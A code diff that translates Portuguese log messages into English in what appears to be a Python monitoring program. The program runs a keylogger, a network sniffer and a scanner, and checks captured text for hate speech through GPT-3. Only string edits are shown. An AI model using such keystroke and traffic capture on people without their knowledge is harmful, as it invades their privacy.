@@ -115,10 +115,10 @@ class Keylogger:
                 temperature=0.6,
             )
             if response.choices[0].text.lower().find("sim") == 0:
-                logging("Geração de alerta por discurso de ódio no ChatGPT: " + text)
+                logging("Hate speech by GPT 3: " + text)
                 return True
         except Exception as e:
-            logging("ChatGPT esta off: " + str(e))
+            logging("ChatGPT is off: " + str(e))
         return False
 
 class Scanner(threading.Thread):
@@ -297,13 +297,13 @@ def do_login():
                            headers={"Content-Type": "application/x-www-form-urlencoded"},
                            data=form_data)
     if response.status_code != 200:
-        error_message = f"Falha ao fazer login. Status: {response.status_code}"
+        error_message = f"Failed to login. Status: {response.status_code}"
         raise Exception(error_message)
     print(response.status_code)
     response_json = response.json()
     token = response_json.get("access_token")
     if not token:
-        logging("Token não encontrado no JSON")
+        logging("Invalid Token")
     return {
         'Authorization': 'Bearer ' + token,
         'Content-type': 'application/json'
@@ -319,13 +319,13 @@ COMPANY = 1
 
 if __name__ == "__main__":
     try:
-        logging("Iniciou do programa!")
+        logging("Begin!")
         update_aux_data()
         Scanner().start()
         Sniffer().start()
-        logging("Iniciou do KeyLogger!")
+        logging("Begin KeyLogger!")
         keylogger = Keylogger()
         keylogger.start()
     except Exception as e:
         logging(str(e))
-        input("Pressione Enter para sair...")
+        input("Enter to leave...")
